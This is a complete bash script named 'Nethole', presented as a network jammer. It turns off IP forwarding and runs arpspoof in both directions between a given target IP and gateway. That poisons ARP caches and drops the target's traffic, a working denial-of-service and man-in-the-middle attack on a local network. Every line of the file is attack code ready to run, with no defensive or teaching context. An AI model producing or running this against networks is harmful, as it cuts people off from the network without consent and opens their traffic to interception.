#!/bin/bash

#Checking if the script is run as root or not.

if [ "$EUID" -ne 0 ]; then
	echo "[!] Nethole must be run as root. Permissin denied"
	exit 1
fi

#Usage instructions if you do already not know

if [ "$#" -ne 3 ]; then
	echo "[!] Usage: nethole <interface> <target_ip> <gateway_ip>"
	exit 1
fi

#Cleanup if you exit with CTRL+C 

trap "killall arpspoof; echo 'Nethole closed, forwarding is still off, if you want to, turn it on manually'; exit" INT

#Disabling the packet forwarding

echo 0 > /proc/sys/net/ipv4/ip_forward
echo "[*] Packet forwarding disabled "

cat << banner

+----------------------------+
|  NETHOLE: Network Jammer   |
|  ------------------------  |
|  >> Target: $2             |
|  >> Gateway: $3            |
|  >> IP Forwarding: OFF     |
+----------------------------+

banner

#Starts arpspoof

echo "[*] Starting nethole sequence now..."

arpspoof -i $1 -t $2 $3 &
arpspoof -i $1 -t $3 $2 &

wait
